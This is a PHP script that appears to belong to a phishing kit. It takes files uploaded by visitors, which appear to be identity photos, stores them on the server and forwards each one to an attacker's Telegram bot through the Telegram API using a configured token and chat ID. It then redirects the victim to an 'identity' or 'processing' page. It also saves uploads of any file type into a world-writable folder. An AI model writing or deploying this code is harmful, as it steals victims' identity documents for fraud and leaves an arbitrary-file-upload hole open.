<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// Include bot settings
include "../../admin/setting/rezlts_settings/bot_settings.php";


// Ensure the uploads directory exists
$uploadDir = '../../uploads/';
if (!file_exists($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

// Check if form was submitted and files were uploaded
if (isset($_FILES['userfile'])) {

    $errors = [];
    $uploadedFiles = [];

    // Loop through uploaded files
    for ($i = 0; $i < count($_FILES['userfile']['name']); $i++) {

        // Get file details
        $file_name = $_FILES['userfile']['name'][$i];
        $file_size = $_FILES['userfile']['size'][$i];
        $file_tmp = $_FILES['userfile']['tmp_name'][$i];
        $file_type = $_FILES['userfile']['type'][$i];

        // Create a unique file name to avoid overwriting
        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
        $unique_name = uniqid('file_', true) . '.' . $file_ext;
        $file_path = $uploadDir . $unique_name;

        if (move_uploaded_file($file_tmp, $file_path)) {
            $uploadedFiles[] = $file_path;

            // Send image to Telegram
            $url = "https://api.telegram.org/bot$api/sendPhoto";
            $post_fields = array('chat_id' => $chatid, 'photo' => new CURLFile($file_path));
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $server_output = curl_exec($ch);

            if (curl_errno($ch)) {
                $errors[] = 'Telegram cURL Error: ' . curl_error($ch);
            }
            curl_close($ch);
        } else {
            $errors[] = 'Error moving file: ' . $file_name;
        }
    }

    if (empty($errors)) {
        // Check SIDV for redirection
       
        if ($SIDV == 'ON') {
            echo '<script>window.location.href = "../../identity/";</script>';
            exit; // Terminate the script
        } else {
            echo '<script>window.location.href = "../../processing/";</script>';
            exit; // Terminate the script
        }
    } else {
        // Show errors if there are any
        echo "Errors occurred:<br>" . implode('<br>', $errors);
    }
}
?>
